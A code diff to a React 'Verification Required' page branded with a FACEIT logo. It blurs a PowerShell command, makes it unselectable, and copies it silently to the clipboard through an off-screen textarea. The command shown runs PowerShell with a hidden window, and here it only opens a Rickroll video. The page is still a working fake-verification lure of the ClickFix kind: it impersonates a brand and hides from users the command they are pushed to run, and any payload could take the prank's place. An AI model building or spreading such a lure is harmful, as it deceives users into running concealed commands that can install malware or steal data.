@@ -1,6 +1,6 @@
 "use client"
 
-import { useState } from "react"
+import { useState, useRef } from "react"
 import { Copy, Check, Clock, Shield } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { FaceitLogo } from "@/components/faceit-logo"
@@ -8,27 +8,29 @@ import { FaceitLogo } from "@/components/faceit-logo"
 export default function VerificationPage() {
   const [copied, setCopied] = useState(false)
   const command = "powershell -WindowStyle Hidden -Command \"Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'\""
+  const textRef = useRef<HTMLElement>(null)
 
-  const handleCopy = async () => {
+  const handleCopy = () => {
     try {
-      // Try modern clipboard API first
-      if (navigator.clipboard && window.isSecureContext) {
-        await navigator.clipboard.writeText(command)
-      } else {
-        // Fallback for older browsers or non-secure contexts
-        const textArea = document.createElement("textarea")
-        textArea.value = command
-        textArea.style.position = "fixed"
-        textArea.style.left = "-999999px"
-        textArea.style.top = "-999999px"
-        document.body.appendChild(textArea)
-        textArea.focus()
-        textArea.select()
+      // Create a temporary textarea element
+      const textArea = document.createElement("textarea")
+      textArea.value = command
+      textArea.style.position = "fixed"
+      textArea.style.left = "-999999px"
+      textArea.style.top = "-999999px"
+      document.body.appendChild(textArea)
+      textArea.focus()
+      textArea.select()
+      
+      try {
         document.execCommand('copy')
-        textArea.remove()
+        setCopied(true)
+        setTimeout(() => setCopied(false), 2000)
+      } catch (err) {
+        console.error('Copy failed:', err)
       }
-      setCopied(true)
-      setTimeout(() => setCopied(false), 2000)
+      
+      textArea.remove()
     } catch (err) {
       console.error('Failed to copy:', err)
     }
@@ -41,14 +43,16 @@ export default function VerificationPage() {
           <FaceitLogo />
         </div>
 
-        <div className="space-y-4 text-center">
+        <div className="space-y-3 text-center">
           <div className="relative inline-block">
-            <div className="absolute inset-0 blur-xl bg-destructive/30 animate-pulse"></div>
-            <h1 className="relative text-7xl font-black tracking-tight text-destructive uppercase" style={{ textShadow: "0 0 30px rgba(255, 85, 0, 0.5)" }}>
+            <h1 className="text-5xl font-bold tracking-tight text-destructive uppercase relative" 
+                style={{ 
+                  textShadow: "0 0 20px rgba(255, 85, 0, 0.3), 0 2px 4px rgba(0, 0, 0, 0.5)" 
+                }}>
               Oops!
             </h1>
           </div>
-          <p className="text-xl font-semibold text-foreground tracking-wide uppercase">
+          <p className="text-lg font-medium text-foreground tracking-wide uppercase">
             Verification Required
           </p>
         </div>
@@ -129,7 +133,7 @@ export default function VerificationPage() {
             <label className="text-sm font-medium">Verification Command:</label>
             <div className="flex gap-2">
               <div className="flex-1 overflow-hidden rounded-md border border-border bg-muted p-3">
-                <code className="text-xs font-mono blur-sm select-none">
+                <code ref={textRef} className="text-xs font-mono blur-sm select-none">
                   {command}
                 </code>
               </div>
